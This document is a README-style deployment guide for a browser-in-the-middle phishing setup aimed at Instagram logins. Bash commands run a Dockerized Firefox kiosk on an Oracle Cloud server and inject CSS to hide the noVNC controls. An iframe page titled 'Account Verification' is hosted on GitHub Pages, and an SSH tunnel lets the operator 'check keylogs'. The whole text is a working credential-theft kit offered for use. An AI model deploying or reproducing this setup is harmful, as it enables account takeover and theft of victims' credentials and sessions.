Oracle Cloud: Browser-in-Browser (BiB) Setup
This repository contains the configuration and deployment steps for a Dockerized Firefox Kiosk running on an Oracle Cloud Ubuntu instance.

1. Server-Side Deployment (Bash)
Run these commands on your Oracle Server to deploy the desktop-mode Firefox container on Port 80.


'''bash
# --- Step A: Cleanup Old Containers ---
sudo docker rm -f firefox-mobile firefox-kiosk firefox 2>/dev/null

# --- Step B: Stop Apache (Free Port 80) ---
sudo systemctl stop apache2 2>/dev/null
sudo systemctl disable apache2 2>/dev/null

# --- Step C: Run Firefox Kiosk (Desktop Mode) ---

sudo docker run -d \
  --name=firefox-kiosk \
  -p 80:5800 \
  -e FF_OPEN_URL="https://www.instagram.com/" \
  -e FF_KIOSK=1 \
  -v ~/firefox_data:/config:rw \
  --shm-size 2g \
  jlesage/firefox

# --- Step D: Inject Stealth CSS ---
# This hides the NoVNC sidebar and dots for a clean "Native" look
sudo docker exec firefox-kiosk sed -i 's/<\/head>/<style>#noVNC_control_bar, #noVNC_control_bar_handle, .noVNC_panel { display: none !important; }<\/style><\/head>/' /opt/noVNC/index.html

# --- Step E: Open Server Firewall ---
sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 5800 -j ACCEPT
'''

2. GitHub Pages "Bridge" (HTML)
Create a file named index.html in your GitHub repository. This will act as the "Secure" front-end that embeds your server.
Note: Replace 132.145.43.235 with your actual Oracle Public IP.

'''HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="http://132.145.43.235"></iframe>
</body>
</html>
'''

3. Admin Access (Local Computer)
To access the "back-end" of the browser (to check keylogs or settings) without using the public Port 80, run this on your Local Machine:

'''Bash
# Open an SSH Tunnel
ssh -i ~/oracle.key -L 8080:localhost:80 ubuntu@132.145.43.235
Access via browser at: http://localhost:8080
'''

